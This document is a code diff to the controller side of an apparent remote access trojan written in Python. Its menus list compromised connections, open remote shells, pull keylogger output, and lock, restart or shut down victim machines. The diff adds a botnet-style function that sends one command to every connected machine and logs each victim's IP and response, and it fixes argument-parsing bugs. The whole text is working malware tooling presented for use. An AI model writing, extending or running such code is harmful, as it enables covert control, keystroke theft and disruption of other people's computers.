@@ -90,6 +90,7 @@ def menu_help():
     print("--l List all connections")
     print("--i Interact with connection")
     print("--e Open remote cmd with connection")
+    print("--s Send command to every connection")
     print("--c Close connection")
     print("--x Exit and close all connections")
 
@@ -103,21 +104,26 @@ def main_menu():
         if strChoice == "--l":
             list_connections()
         elif strChoice[:3] == "--i" and len(strChoice) > 3:
-            conn = select_connection(strChoice[3:len(strChoice)], "True")
+            conn = select_connection(strChoice[4:len(strChoice)], "True")
             if conn is not None:
                 send_commands()
         elif strChoice == "--help":
             menu_help()
         elif strChoice[:3] == "--c" and len(strChoice) > 3:
-            conn = select_connection(strChoice[3:len(strChoice)], "False")
-            conn.send(str.encode("exit"))
+            conn = select_connection(strChoice[4:len(strChoice)], "False")
+
+            if conn is not None:
+                conn.send(str.encode("exit"))
+                conn.close()
         elif strChoice == "--x":
             close()
             break  # break to continue work() function
         elif strChoice[:3] == "--e" and len(strChoice) > 3:
-            conn = select_connection(strChoice[3:len(strChoice)], "False")
+            conn = select_connection(strChoice[4:len(strChoice)], "False")
             if conn is not None:
                 command_shell()
+        elif strChoice[:3] == "--s" and len(strChoice) > 3:
+            send_command_all(strChoice[4:len(strChoice)])
         else:
             print("Invalid choice, please try again!")
             menu_help()
@@ -171,6 +177,17 @@ def select_connection(connection_id, blnGetResponse):
         if blnGetResponse == "True":
             print("You are connected to " + strIP + " ...." + "\n")
         return conn
+
+
+def send_command_all(command):
+    if os.path.isfile("command_log.txt"):
+        open("command_log.txt", "w").close()  # clear previous log contents
+
+    for intCounter in range(0, len(arAddresses)):
+        conn = select_connection(intCounter, "False")
+
+        if conn is not None and command != "cmd":
+            send_command(command)
 
 
 def user_info():
@@ -321,20 +338,20 @@ def receive():
 
 def lock_res_shut(args):
     conn.send(str.encode("shutreslock"))
-    if args[1] == "1":
+    if args[0] == "1":
         conn.send(str.encode("lock"))
         return "False"
 
-    if args[1] == "2":
+    if args[0] == "2":
         strCommand = "-r"
-    elif args[1] == "3":
+    elif args[0] == "3":
         strCommand = "-s"
     else:
         print("Invalid Choice!")
         return "False"
 
-    if len(args) > 2:  # if the user is sending a message
-        strMessage = args[2:len(args)]
+    if len(args) > 1:  # if the user is sending a message
+        strMessage = args[1:len(args)]
     else:
         strMessage = " none"
     conn.send(str.encode(strCommand + strMessage))
@@ -415,6 +432,21 @@ def keylogger(option):
         print("\n" + strLogs)
 
 
+def send_command(command):
+    conn.send(str.encode("runcmd" + command))
+    intBuffer = int(conn.recv(1024).decode("utf-8"))  # receive buffer size
+    strClientResponse = "========================" + "\n" + strIP + "\t" + decode_utf8(recvall(intBuffer)) + \
+                        "========================"
+
+    if os.path.isfile("command_log.txt"):
+        objLogFile = open("command_log.txt", "a")
+    else:
+        objLogFile = open("command_log.txt", "w")
+
+    objLogFile.write(strClientResponse + "\n" + "\n")
+    objLogFile.close()
+
+
 def show_help():
     print("--help")
     print("--m Send message")
@@ -470,7 +502,7 @@ def send_commands():
             elif strChoice == "--r":
                 receive()
             elif strChoice[:3] == "--x" and len(strChoice) > 3:
-                blnClose = lock_res_shut(strChoice[3:len(strChoice)])
+                blnClose = lock_res_shut(strChoice[4:len(strChoice)])
                 if blnClose == "True":  # if the computer is shutdown
                     conn.close()
                     break
